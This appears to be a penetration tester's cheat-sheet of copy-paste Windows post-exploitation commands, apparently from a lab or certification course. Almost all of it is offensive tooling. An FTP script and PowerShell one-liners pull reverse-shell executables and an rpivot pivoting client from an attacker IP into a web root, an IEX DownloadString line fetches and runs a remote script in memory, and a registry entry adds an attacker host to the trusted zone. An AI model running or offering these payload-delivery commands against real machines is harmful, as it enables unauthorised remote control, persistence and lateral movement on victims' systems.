## Script Templates

Use this doc as temp space to create scripts to copy/paste

### FTP Script

```bash
mkdir c:\temp
cd c:\temp
echo open 192.168.119.216 21> ftp.txt
echo USER rock>> ftp.txt
echo roll>> ftp.txt
echo passive >> ftp.txt
echo bin >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
del ftp.txt
```

### PowerShell Download

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216/win_rev_tcp_8000.exe','c:\xampp\htdocs\win_rev_tcp_8000.exe')"

powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216/rpivot-client.exe','C:\coyote\rpivot-client.exe')"
```

```bash
echo $webclient = New-Object System.Net.WebClient>wget.ps1
echo $url = "http://192.168.119.216/reverse_tcp_8001.exe" >>wget.ps1
echo $file = "reverse_tcp_8001.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

### Remote Script

```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.216/backhand.ps1')
```

### MSF Command

```bash

```

### Registry Edit

Need to add a page for this too

```powershell
Windows Registry Editor Version 5.00 [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\192.168.1.241] "*"=dword:00000001"
```

